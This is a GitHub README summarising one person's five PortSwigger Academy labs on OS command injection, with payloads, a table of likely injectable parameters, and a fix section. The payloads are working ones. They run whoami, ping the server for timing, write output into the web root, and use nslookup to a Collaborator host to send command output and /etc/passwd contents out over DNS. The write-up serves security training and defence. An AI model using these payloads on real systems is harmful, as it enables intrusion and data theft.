# 💉 OS Command Injection — Complete Lab Series

<div align="center">

![Category](https://img.shields.io/badge/Category-OS%20Command%20Injection-critical?style=for-the-badge)
![Labs Completed](https://img.shields.io/badge/Labs%20Completed-5%2F5-00C853?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice%20to%20Practitioner-FF6D00?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-100%25%20Complete-00C853?style=for-the-badge)

**5 labs. Apprentice through Practitioner. All done.**

[![🔗 Main Repository](https://img.shields.io/badge/🔗%20Main%20Repository-black?style=for-the-badge)](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) [![👤 About Me](https://img.shields.io/badge/👤%20About%20Me-5865F2?style=for-the-badge)](https://github.com/Gurpreet-Singh-offensive-Security) [![📧 Contact](https://img.shields.io/badge/📧%20Contact-E8562A?style=for-the-badge)](mailto:gskhalsa6245@gmail.com)

</div>

---

Finished all 5 PortSwigger OS Command Injection labs. Lab 1 is straightforward — output comes back in the response. Labs 2 through 5 are all blind variants where the output never returns directly, so each one introduces a different technique to confirm execution and extract data. Notes below are what I actually did.

**Tools:** Burp Suite Pro, Burp Collaborator, Python  
**Focus areas:** In-band injection, time-based blind, output redirection, out-of-band interaction, DNS data exfiltration

---

## Labs

### Apprentice — 1/1

| # | Lab | What I did | Technique |
|---|-----|-----------|-----------|
| 1 | [OS Command Injection, Simple Case](./LAB-1-OS-Command-Injection.md) | Stock checker passes `productId` and `storeId` directly to a shell command. Injected `1\|whoami` into `storeId`. The pipe terminates the original command and runs `whoami` — output came back in the HTTP response directly. Confirmed username, lab solved. | In-band injection |

---

### Practitioner — 4/4

All four are blind — no output in the response. Each lab requires a different method to prove the command ran and extract information.

| # | Lab | What I did | Technique |
|---|-----|-----------|-----------|
| 2 | [Blind OS Command Injection with Time Delays](./LAB-2-OS-Command-Injection.md) | Injected into the `email` field of the feedback form. No output anywhere in the response. Payload: `email=x\|\|ping+-c+10+127.0.0.1\|\|` — forced the server to ping itself 10 times. Response took ~10 seconds to return. Delay confirmed blind RCE. | Time-based blind |
| 3 | [Blind OS Command Injection with Output Redirection](./LAB-3-OS-Command-Injection.md) | Same blind injection point. This time redirected output to a file in the web root: `email=x\|\|whoami>/var/www/images/out.txt\|\|`. Then fetched `/image?filename=out.txt` — server returned the username. Output written to disk, retrieved over HTTP. | Output redirection |
| 4 | [Blind OS Command Injection with Out-of-Band Interaction](./LAB-4-OS-Command-Injection.md) | Confirmed injection exists when no output channel and no timing difference is reliable. Payload forced a DNS lookup to my Burp Collaborator subdomain: `` email=x||nslookup+`burpcollaborator.net`|| ``. Collaborator logged the DNS interaction — confirmed code execution without any response-side signal. | OOB DNS interaction |
| 5 | [Blind OS Command Injection with Out-of-Band Data Exfiltration](./LAB-5-OS-Command-Injection.md) | Same OOB approach but with actual data exfiltrated. Embedded `whoami` output inside the DNS lookup subdomain: `` email=x||nslookup+`whoami`.COLLABORATOR-ID.burpcollaborator.net|| ``. Collaborator received the DNS query — the subdomain prefix was the username. Data extracted entirely through DNS with no HTTP response involved. | OOB DNS exfiltration |

---

## How Each Technique Works

### In-Band (Lab 1)

Output returns directly in the HTTP response. The application runs a shell command and includes its stdout in the page.

```
Original: stockreport.sh productId storeId
Injected: storeId = 1|whoami

Shell executes: stockreport.sh productId 1|whoami
→ whoami output printed to response
```

Shell metacharacters that work here:

```
|    pipe — output of left goes to right
;    sequential — run both regardless
&    background — both run, order not guaranteed
&&   conditional — right runs only if left succeeds
||   conditional — right runs only if left fails
```

---

### Time-Based Blind (Lab 2)

No output. Confirm execution by measuring how long the server takes to respond.

```
Payload: ||ping -c 10 127.0.0.1||

Server pings itself 10 times before responding.
Normal response: < 1 second
Injected response: ~10 seconds

Delay = confirmed execution
```

Useful when: no output channel exists and the app doesn't make outbound connections.  
Limitation: unreliable on slow or variable networks. Not useful for data extraction.

---

### Output Redirection (Lab 3)

No output in response, but the server has a writable directory that's also web-accessible.

```
Payload: ||whoami>/var/www/images/out.txt||

Step 1 — write:
Server executes whoami, redirects stdout to /var/www/images/out.txt

Step 2 — read:
GET /image?filename=out.txt
→ Response body: peter-xzy123
```

Requires: write access to a directory the web server also serves files from.  
Common writable paths worth trying: `/var/www/images/`, `/var/www/html/`, `/tmp/`, `/usr/share/nginx/html/`

---

### Out-of-Band DNS Interaction (Lab 4)

No output, no delay difference, no writable directory. Confirm execution by making the server contact an external host you control.

```
Payload: ||nslookup COLLABORATOR-SUBDOMAIN.burpcollaborator.net||

Server resolves the domain → DNS query hits Collaborator
Collaborator logs: DNS interaction received from [server IP]
→ Execution confirmed
```

Works even when the server has no HTTP egress — DNS is almost always allowed outbound.  
Burp Collaborator handles the listener automatically.

---

### Out-of-Band Data Exfiltration (Lab 5)

Same OOB channel, but command output is embedded in the DNS lookup itself.

```
Payload: ||nslookup `whoami`.COLLABORATOR-ID.burpcollaborator.net||

Shell evaluates `whoami` first → returns "peter-xzy123"
Then resolves: peter-xzy123.COLLABORATOR-ID.burpcollaborator.net

Collaborator logs the full subdomain including the exfiltrated value.
```

The backtick (`` ` ``) or `$()` causes the shell to execute the inner command first and substitute its output into the string before the outer command runs. That substituted value becomes part of the DNS hostname.

```bash
# Both forms work
`whoami`.collaborator.net
$(whoami).collaborator.net

# Other data worth extracting the same way
`hostname`.collaborator.net
`cat /etc/passwd | head -1 | base64`.collaborator.net
`id`.collaborator.net
```

---

## Possible Parameters in Modern Security

These are the parameters and input points where OS command injection realistically appears in modern web applications, APIs, and infrastructure. Worth checking these specifically when testing.

### Web Application Parameters

| Parameter | Context | Why it's injectable |
|-----------|---------|---------------------|
| `filename`, `file`, `path` | File operations, image processing | Passed to `convert`, `ffmpeg`, `identify`, `zip` |
| `host`, `domain`, `ip` | DNS resolution, ping, traceroute tools | Passed directly to shell network utilities |
| `url` | URL fetchers, preview generators | Passed to `curl`, `wget`, `nslookup` |
| `email` | Contact forms, feedback endpoints | Used in `sendmail`, `mail` shell calls |
| `username`, `user` | System provisioning, account tools | Passed to `useradd`, `id`, directory tools |
| `cmd`, `command`, `exec`, `run` | Debug/admin panels, legacy tools | Obvious — direct command intent |
| `port`, `interface` | Network diagnostic tools | Passed to `netstat`, `nmap`, `ifconfig` |
| `lang`, `locale` | Locale switching | Used in shell-based locale utilities |
| `template`, `report` | PDF/report generators | Passed to `wkhtmltopdf`, `pandoc`, LaTeX tools |
| `format`, `type`, `ext` | File conversion endpoints | Passed to `convert`, `ffmpeg` with shell expansion |

---

### API & Modern Infrastructure

| Surface | Parameter / Header | Why it's injectable |
|---------|-------------------|---------------------|
| REST APIs | `target`, `host`, `destination` | Network reachability checks, webhook validators |
| Webhook validators | `url`, `endpoint` | App curls the URL to verify it's reachable |
| CI/CD pipelines | `branch`, `repo`, `tag`, `commit` | Passed to `git clone`, `git checkout` without sanitization |
| Container management | `image`, `tag`, `name` | Passed to `docker run`, `docker pull` |
| Cloud CLIs | `region`, `profile`, `bucket` | Passed to `aws`, `gcloud`, `az` shell wrappers |
| SNMP / network monitoring | `community`, `oid`, `device` | Passed to `snmpwalk`, `snmpget` |
| Log management | `query`, `filter`, `index` | Some log tools spawn shell subprocesses |
| Scheduled jobs | `cron`, `schedule`, `interval` | Cron syntax or shell command stored and executed |
| Server-side PDF | `header`, `footer`, `url` | `wkhtmltopdf` accepts URLs including `file://` and shell expansion |
| Image processing | `resize`, `quality`, `watermark` | ImageMagick MVG/shell delegate injection |

---

### Legacy and Internal Systems

| System | Injection Point | Notes |
|--------|----------------|-------|
| Network devices (routers, switches) | Web UI diagnostic fields (ping, traceroute) | Often PHP calling shell directly, no sanitization |
| Industrial / SCADA web interfaces | Device name, IP, polling interval | Frequently unpatched, shell calls common |
| Internal admin tools | Any freeform input field | Built quickly, not security reviewed |
| Backup utilities | Path fields, schedule fields | Call `tar`, `rsync`, `scp` via shell |
| Monitoring dashboards | Host, service, check command | Nagios-style tools define checks as shell commands |
| PHP applications pre-2015 | Any parameter passed to `exec()`, `system()`, `passthru()` | Extremely common in legacy codebases |

---

### Modern Frameworks — Less Common but Still Occurs

| Framework / Stack | Where | How |
|-------------------|-------|-----|
| Node.js | `child_process.exec()` with template literals | String interpolation passes user input into shell |
| Python | `subprocess.run(shell=True)` + f-strings | `shell=True` passes the full string to `/bin/sh` |
| Ruby | Backtick operator, `system()`, `IO.popen` | Backticks in Ruby execute shell commands directly |
| Go | `exec.Command()` with unsanitized args | Less common — Go avoids shell by default, but misuse exists |
| Java | `Runtime.exec()` with string concatenation | Older Java apps, especially internal tools |
| PHP | `exec()`, `shell_exec()`, `passthru()`, `popen()`, backticks | Still the most common in legacy PHP |

---

### Headers Worth Testing

Some injection points aren't in the request body — they're in headers the server uses for operational purposes.

```
User-Agent     → sometimes logged and processed by log analysis tools
Referer        → similar — passed to analytics or reporting shells
X-Forwarded-For → if used in shell-based IP logging or blocking tools
Host           → if passed to DNS resolution or virtual host scripts
Content-Type   → if used in file type detection via shell utilities
```

---

## Fix

The same root cause in every lab: user input reached a shell. The fix is to not let that happen.

**Preferred approach — don't call shell at all:**
```python
# Instead of: subprocess.run(f"ping {host}", shell=True)
# Use:
subprocess.run(["ping", "-c", "1", host], shell=False)
```

`shell=False` passes arguments as a list directly to the OS. No shell interprets them. Metacharacters like `|`, `;`, `&` become literal strings — they can't affect execution.

**If a shell call is unavoidable — allowlist the input:**
```python
import re

# Only allow what you explicitly expect
if not re.match(r'^\d{1,5}$', store_id):
    return 400

# For hostnames
if not re.match(r'^[a-zA-Z0-9\-\.]+$', hostname):
    return 400
```

**Validate the output side, not just the input side:**  
Even with input validation, run the final constructed command through a review — if the user-controlled portion appears anywhere near shell operators, reconsider the design.

**Least privilege:**  
The web application process shouldn't run as root. If command injection does occur, the blast radius is whatever the app's OS user can access — keep that minimal.

---

## Tools

| Tool | What I used it for |
|------|--------------------|
| Burp Suite Pro | Repeater for all labs, HTTP history to identify injection points |
| Burp Collaborator | Labs 4 and 5 — OOB DNS listener, captured interaction and exfiltrated data |
| Python | Cookie and payload generation for automation |

---

## Lab Order

Do them in order. Lab 1 shows you what successful injection looks like when you can see it. Labs 2–5 progressively remove visibility — each one teaches a different method to work blind. Lab 5 is the most useful in real engagements because DNS egress is rarely blocked even when HTTP isn't available.

---

## Completion

- [x] Lab 1 — OS Command Injection, Simple Case
- [x] Lab 2 — Blind OS Command Injection with Time Delays
- [x] Lab 3 — Blind OS Command Injection with Output Redirection
- [x] Lab 4 — Blind OS Command Injection with Out-of-Band Interaction
- [x] Lab 5 — Blind OS Command Injection with Out-of-Band Data Exfiltration

---

## Resources

- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [OWASP A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)

Other series in this repo:
- [Authentication Vulnerabilities](../AUTHENTICATION/) — 14 labs done
- [Web Cache Deception](../web-cache-deception/) — 5 labs done
- [Path Traversal](../Path-Traversal/) — 6 labs done
- SQL Injection — in progress

---

## Legal

Done entirely on PortSwigger Academy's lab environment. Using any of this against systems you don't own or don't have written permission to test is illegal.

---

<div align="center">

### Gurpreet Singh | Offensive Security Researcher

[![EMAIL](https://img.shields.io/badge/EMAIL-GSKHALSA6245%40GMAIL.COM-EA4335?style=for-the-badge&logo=gmail&logoColor=white)](mailto:gskhalsa6245@gmail.com)

[![GITHUB](https://img.shields.io/badge/GITHUB-GURPREET--SINGH--OFFENSIVE--SECURITY-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) [![LINKEDIN](https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/gurpreetsingh-security)

**CC BY-NC-ND 4.0 — © 2025 Gurpreet Singh**

</div>
